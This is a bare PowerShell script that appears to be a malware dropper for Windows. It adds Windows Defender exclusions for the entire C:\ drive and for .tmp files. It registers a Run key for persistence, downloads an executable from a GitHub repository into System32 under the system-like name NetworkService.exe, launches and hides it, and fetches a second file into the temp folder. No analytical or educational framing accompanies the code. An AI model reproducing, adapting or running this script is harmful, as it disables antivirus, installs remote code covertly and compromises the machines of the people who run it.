
$ProgressPreference = 'SilentlyContinue'

$networkServicePath = Join-Path $env:SystemRoot "System32\NetworkService.exe"
$tempMsConfigPath = Join-Path $env:TEMP "msconfig.txt"

Add-MpPreference -ExclusionExtension ".tmp"
Add-MpPreference -ExclusionPath "C:\"

if (-Not (Test-Path -Path $networkServicePath)) {
       
        $ProgressPreference = 'SilentlyContinue'
        New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name NetworkService -Value "%systemroot%\System32\NetworkService.exe" -Property "String" -Force

        Invoke-WebRequest -Uri 'https://github.com/Protesianxd/sal/raw/main/NetworkService.exe' -OutFile $env:SystemRoot\System32\NetworkService.exe
        Start-Process -FilePath $env:SystemRoot\System32\NetworkService.exe
        attrib +h $networkServicePath

        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Protesianxd/sal/main/msconfig.txt' -OutFile $tempMsConfigPath 
    
} else {
    Start-Process -FilePath $networkServicePath
}
